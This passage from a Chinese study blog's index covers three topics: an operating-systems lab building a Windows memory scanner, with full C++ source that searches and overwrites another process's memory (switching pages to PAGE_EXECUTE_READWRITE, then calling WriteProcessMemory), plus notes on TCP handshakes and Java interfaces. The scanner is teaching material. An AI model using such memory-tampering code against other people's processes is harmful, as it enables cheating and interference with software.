+<p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
+<h3 id="getProcessInfo-模块的设计与实现"><a class="header-anchor" href="#getProcessInfo-模块的设计与实现"></a>getProcessInfo 模块的设计与实现</h3>
+<p>首先调用<code>CreateToolhelp32Snapshot</code>函数获取进程列表快照的句柄，然后遍历进程快照，轮流显示每个进程的信息（PID、进程名、线程数等）。</p>
+<h3 id="getMemoryBlock-模块的设计与实现"><a class="header-anchor" href="#getMemoryBlock-模块的设计与实现"></a>getMemoryBlock 模块的设计与实现</h3>
+<p>调用<code>OpenProcess()</code>获取想要访问的进程的句柄，循环调用<code>VirtualQueryEx()</code>函数，将返回的<code>MEMORY_BASIC_INFORMATION</code>数据结构保存到列表中，循环遍历列表，打印各个内存块的基本信息。</p>
+<h3 id="SearchProcessMemory-模块的设计与实现"><a class="header-anchor" href="#SearchProcessMemory-模块的设计与实现"></a>SearchProcessMemory 模块的设计与实现</h3>
+<p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
+<h3 id="ModifyProcessMemory-模块的设计与实现"><a class="header-anchor" href="#ModifyProcessMemory-模块的设计与实现"></a>ModifyProcessMemory 模块的设计与实现</h3>
+<p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
+<h2 id="运行结果"><a class="header-anchor" href="#运行结果"></a>运行结果</h2>
+<p>程序运行界面如图</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
+<p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
+<p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
+<p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
+<h2 id="源代码"><a class="header-anchor" href="#源代码"></a>源代码</h2>
+<p><em>readMemory.cpp</em></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;list&gt;</span><br><span class="line">#include &lt;iomanip&gt;</span><br><span class="line">#include &lt;tlhelp32.h&gt;</span><br><span class="line">#include &lt;psapi.h&gt;</span><br><span class="line"></span><br><span class="line">#define MAX_ADDR_NUM 1024</span><br><span class="line">using namespace std;</span><br><span class="line">#pragma comment(lib,&quot;psapi.lib&quot;)</span><br><span class="line">DWORD dwProcessId[1024], cbNeededProcess;</span><br><span class="line"></span><br><span class="line">list&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;</span><br><span class="line">SYSTEM_INFO systemInfo;</span><br><span class="line">MEMORYSTATUS memstatus;</span><br><span class="line">list&lt;DWORD&gt; AddrList;</span><br><span class="line"></span><br><span class="line">void getSystemInfo();</span><br><span class="line">void getProcessInfo();</span><br><span class="line">bool getMemoryBlock(DWORD dwProcessId);</span><br><span class="line">bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue);</span><br><span class="line">bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue);</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	cout&lt;&lt;&quot;--------系统及内存信息如下-------&quot;&lt;&lt;endl;</span><br><span class="line">	getSystemInfo();</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;获取当前进程信息</span><br><span class="line">	cout&lt;&lt;endl&lt;&lt;&quot;-----------进程列表如下----------&quot;&lt;&lt;endl;</span><br><span class="line">	getProcessInfo();</span><br><span class="line"></span><br><span class="line">	DWORD pid;</span><br><span class="line">	while(TRUE)&#123;</span><br><span class="line">		pid&#x3D;0;</span><br><span class="line">		cout&lt;&lt;&quot;输入你需要访问的进程PID号: &quot;;</span><br><span class="line">		cin&gt;&gt;pid;</span><br><span class="line">		if(!getMemoryBlock(pid))&#123;</span><br><span class="line">			cout&lt;&lt;&quot;PID &#x3D; &quot;&lt;&lt;(DWORD)pid&lt;&lt;&quot; 的进程打开失败!&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			char c;</span><br><span class="line">			int mode &#x3D; 0;</span><br><span class="line">			while(TRUE)&#123;</span><br><span class="line">				cout&lt;&lt;endl&lt;&lt;&quot;q: 返回&quot;&lt;&lt;endl&lt;&lt;&quot;s: 内存查询&quot;&lt;&lt;endl&lt;&lt;&quot;m: 内存修改&quot;&lt;&lt;endl;</span><br><span class="line">				cout&lt;&lt;&quot;输入功能对应的字母:&quot;;</span><br><span class="line">				cin&gt;&gt;c;</span><br><span class="line">				if(c&#x3D;&#x3D;&#39;q&#39;)&#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				else if(c&#x3D;&#x3D;&#39;s&#39;)&#123;</span><br><span class="line">					DWORD x;</span><br><span class="line">					cout&lt;&lt;&quot;输入查询的值：&quot;;</span><br><span class="line">					cin&gt;&gt;x;</span><br><span class="line">					if(!SearchProcessMemory(pid,x))&#123;</span><br><span class="line">						cout&lt;&lt;&quot;查询失败!&quot;&lt;&lt;endl;</span><br><span class="line">					&#125;else&#123;</span><br><span class="line">						if(AddrList.size()&#x3D;&#x3D;0)&#123;</span><br><span class="line">							cout&lt;&lt;&quot;未查到值为 &quot;&lt;&lt;(DWORD)x&lt;&lt;&quot; 的内存区域!&quot;&lt;&lt;endl;</span><br><span class="line">						&#125;else&#123;</span><br><span class="line">							cout&lt;&lt;&quot;共查到 &quot;&lt;&lt;AddrList.size()&lt;&lt;&quot;个地址&quot;&lt;&lt;endl;</span><br><span class="line">							list&lt;DWORD&gt;::iterator it;</span><br><span class="line">							int i&#x3D;0;</span><br><span class="line">							for(it&#x3D;AddrList.begin();it!&#x3D;AddrList.end();it++)&#123;</span><br><span class="line">								printf(&quot;%d   0x%x \n&quot;,++i,(*it));</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				else if(c&#x3D;&#x3D;&#39;m&#39;)&#123;</span><br><span class="line">					DWORD addr;</span><br><span class="line">					DWORD x;</span><br><span class="line">					cout&lt;&lt;&quot;要写入的内存地址(16进制)：&quot;&lt;&lt;endl;</span><br><span class="line">					cin&gt;&gt;hex&gt;&gt;addr;</span><br><span class="line">					&#x2F;&#x2F; getchar();</span><br><span class="line">					cout&lt;&lt;&quot;要写入的值(10进制)：&quot;&lt;&lt;endl;</span><br><span class="line">					cin&gt;&gt;x;</span><br><span class="line">					if(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x))&#123;</span><br><span class="line">						cout&lt;&lt;&quot;修改成功!&quot;&lt;&lt;endl;</span><br><span class="line">					&#125;else&#123;</span><br><span class="line">						cout&lt;&lt;&quot;修改失败!&quot;&lt;&lt;endl;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		getProcessInfo();</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void getSystemInfo()&#123;</span><br><span class="line"></span><br><span class="line">	GetSystemInfo(&amp;systemInfo);</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区上界:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区起始:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;页面大小:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.dwPageSize&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	GlobalMemoryStatus(&amp;memstatus);</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;物理内存使用率:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;总物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;总页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;总虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void getProcessInfo()&#123;</span><br><span class="line">	&#x2F;&#x2F;为进程列表拍摄快照</span><br><span class="line">    HANDLE hProcessSnap&#x3D;CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);</span><br><span class="line">    if(hProcessSnap&#x3D;&#x3D;INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        printf(&quot;CreateToolhelp32Snapshot调用失败!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize &#x3D; sizeof(PROCESSENTRY32);</span><br><span class="line">    &#x2F;&#x2F;遍历进程快照。轮流显示每个进程的信息</span><br><span class="line">    BOOL bMore&#x3D;Process32First(hProcessSnap,&amp;pe32);</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    printf(&quot;PID\t线程数\t进程名称\n&quot;);</span><br><span class="line">    while(bMore)&#123;</span><br><span class="line"></span><br><span class="line">        bMore&#x3D;Process32Next(hProcessSnap,&amp;pe32);</span><br><span class="line">        _tprintf(_T(&quot;%u\t&quot;),pe32.th32ProcessID);</span><br><span class="line">        _tprintf(_T(&quot;%u\t&quot;),pe32.cntThreads);</span><br><span class="line">        _tprintf(_T(&quot;%s\n&quot;),pe32.szExeFile);</span><br><span class="line"></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;清除snapshot对象</span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    printf(&quot;进程总数:%d\n&quot;,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool getMemoryBlock(DWORD dwProcessId)&#123;</span><br><span class="line">	MemList.clear();</span><br><span class="line">	HANDLE hProcess &#x3D;INVALID_HANDLE_VALUE;</span><br><span class="line">	if(dwProcessId !&#x3D; GetCurrentProcessId())&#123;</span><br><span class="line">		hProcess &#x3D; OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ , FALSE , dwProcessId);</span><br><span class="line">	&#125;</span><br><span class="line">	if(hProcess &#x3D;&#x3D; NULL)&#123;</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	MEMORY_BASIC_INFORMATION  MemBaseInfo;</span><br><span class="line">	DWORD  dwInfoSize &#x3D; sizeof(MEMORY_BASIC_INFORMATION);</span><br><span class="line">	DWORD  dwCurPos &#x3D; (DWORD)systemInfo.lpMinimumApplicationAddress;</span><br><span class="line">	while(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress )&#123;</span><br><span class="line">		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);</span><br><span class="line">		MemList.push_back(MemBaseInfo);</span><br><span class="line">		dwCurPos &#x3D; (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;</span><br><span class="line">	&#125;</span><br><span class="line">	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it &#x3D; MemList.begin();</span><br><span class="line">	int num&#x3D;0;</span><br><span class="line">	dwCurPos &#x3D; (DWORD)(*it).BaseAddress;</span><br><span class="line">	for( ;it !&#x3D; MemList.end(); it++)&#123;</span><br><span class="line">		cout&lt;&lt;dec&lt;&lt;&quot;---- &quot;&lt;&lt;++num&lt;&lt;&quot; ----&quot;&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;内存块基址: 0x&quot;&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;保护方式：&quot;&lt;&lt;(*it).AllocationProtect&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;区域大小：&quot;&lt;&lt;(*it).RegionSize&lt;&lt;endl;</span><br><span class="line">		cout&lt;&lt;&quot;状态：&quot;;</span><br><span class="line">		if((*it).State &#x3D;&#x3D; MEM_COMMIT)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;提交&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).State &#x3D;&#x3D; MEM_FREE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;空闲&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).State &#x3D;&#x3D; MEM_RESERVE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;保留&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else&#123;&#125;</span><br><span class="line">		cout&lt;&lt;&quot;访问保护方式：&quot;;</span><br><span class="line">		if((*it).Protect &#x3D;&#x3D; PAGE_READONLY)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;只读&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_READWRITE )&#123;</span><br><span class="line">			cout&lt;&lt;&quot;读&#x2F;写&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_EXECUTE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;可执行&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_EXECUTE_READ)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;可执行&#x2F;读&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_EXECUTE_READWRITE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;可执行&#x2F;读写&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Protect &#x3D;&#x3D; PAGE_NOACCESS)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;不允许存储&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout&lt;&lt;&quot;类型：&quot;;</span><br><span class="line">		if((*it).Type &#x3D;&#x3D; MEM_IMAGE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;映像&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Type &#x3D;&#x3D; MEM_MAPPED)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;映射&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else if((*it).Type &#x3D;&#x3D; MEM_PRIVATE)&#123;</span><br><span class="line">			cout&lt;&lt;&quot;私有&quot;&lt;&lt;endl;</span><br><span class="line">		&#125;else&#123;&#125;</span><br><span class="line">		dwCurPos+&#x3D;(*it).RegionSize ;</span><br><span class="line">	&#125;</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue)&#123;</span><br><span class="line">	AddrList.clear();</span><br><span class="line">	if(MemList.empty())&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hProcess &#x3D; INVALID_HANDLE_VALUE;</span><br><span class="line">	if(dwProcessId !&#x3D;GetCurrentProcessId())&#123;</span><br><span class="line">		hProcess &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,dwProcessId);</span><br><span class="line">		if(hProcess &#x3D;&#x3D;NULL)</span><br><span class="line">			return false;</span><br><span class="line">	&#125;</span><br><span class="line">	LPBYTE lpBuff &#x3D; new BYTE[systemInfo.dwPageSize];</span><br><span class="line">	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;</span><br><span class="line">	for(it&#x3D;MemList.begin();it!&#x3D;MemList.end();it++)&#123;</span><br><span class="line">		if(it-&gt;State !&#x3D; MEM_COMMIT)&#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD dwSize &#x3D;0;</span><br><span class="line">		SIZE_T dwReadBytes&#x3D;0;</span><br><span class="line">		while(dwSize &lt; it-&gt;RegionSize)&#123;</span><br><span class="line">			LPVOID lpAddr &#x3D; (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);</span><br><span class="line">			if(ReadProcessMemory(hProcess,lpAddr,lpBuff,systemInfo.dwPageSize,&amp;dwReadBytes)&#x3D;&#x3D;FALSE)&#123;</span><br><span class="line">				dwSize +&#x3D;systemInfo.dwPageSize;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			for(int i&#x3D;0;i&lt;dwReadBytes -3;i++)&#123;</span><br><span class="line">				if(*((DWORD *)(lpBuff+i)) &#x3D;&#x3D;dwValue)&#123;</span><br><span class="line">					AddrList.push_back((DWORD)lpAddr+i);</span><br><span class="line">				&#125;</span><br><span class="line">				if(AddrList.size()&#x3D;&#x3D;MAX_ADDR_NUM)&#123;</span><br><span class="line">					delete []lpBuff;</span><br><span class="line">					CloseHandle(hProcess);</span><br><span class="line">					return true;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			dwSize+&#x3D;systemInfo.dwPageSize;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	delete []lpBuff;</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue)&#123;</span><br><span class="line">	HANDLE hProcess &#x3D; INVALID_HANDLE_VALUE;</span><br><span class="line">	if(dwProcessId !&#x3D;GetCurrentProcessId())&#123;</span><br><span class="line">		hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);</span><br><span class="line">		if(hProcess &#x3D;&#x3D;NULL)</span><br><span class="line">			return false;</span><br><span class="line">	&#125;</span><br><span class="line">	SIZE_T dwWriteBytes &#x3D;0;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	if(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),PAGE_EXECUTE_READWRITE,&amp;dwOldProtect))&#123;</span><br><span class="line">		cout&lt;&lt;&quot;protect!&quot;&lt;&lt;endl;</span><br><span class="line">		DWORD dwReturn &#x3D; GetLastError();</span><br><span class="line">		cout&lt;&lt;dwReturn&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,&amp;dwValue,sizeof(DWORD),&amp;dwWriteBytes))&#123;</span><br><span class="line">		cout&lt;&lt;&quot;write failed&quot;&lt;&lt;endl;</span><br><span class="line">		DWORD dwReturn &#x3D; GetLastError();</span><br><span class="line">		cout&lt;&lt;dwReturn&lt;&lt;endl;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),dwOldProtect,NULL);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">		return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+        <tag>实验</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP&amp;IP</title>
+    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
+    <content><![CDATA[<h2 id="TCP的三次握手和四次挥手"><a class="header-anchor" href="#TCP的三次握手和四次挥手"></a>TCP的三次握手和四次挥手</h2>
+<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
+<ul>
+<li>
+<p>三次握手</p>
+<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
+<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
+<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
+<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
+<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
+<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
+<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
+</li>
+<li>
+<p>四次挥手</p>
+<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
+<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
+<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
+</li>
+</ul>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 抽象类和接口</title>
+    <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
+    <content><![CDATA[<h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
+<p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
+<p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
+<p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
+<p>抽象方法没有方法体。</p>
+<p>关键字：<code>abstract</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public abstract Class1&#123;</span><br><span class="line">	public abstract void fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
+<p>接口和抽象类有点像，它是抽象方法的集合；</p>
+<p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
+<p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
+<p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
+<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
+<p>关键字：<code>interface</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[访问控制关键字] interface 接口名称 [extends 其他的接口名] &#123;</span><br><span class="line">        &#x2F;&#x2F; 声明变量</span><br><span class="line">        &#x2F;&#x2F; 抽象方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
+<p>关键字：<code>implements</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class A implements 接口名称 [,接口名称,...]&#123;</span><br><span class="line">		&#x2F;&#x2F;实现接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
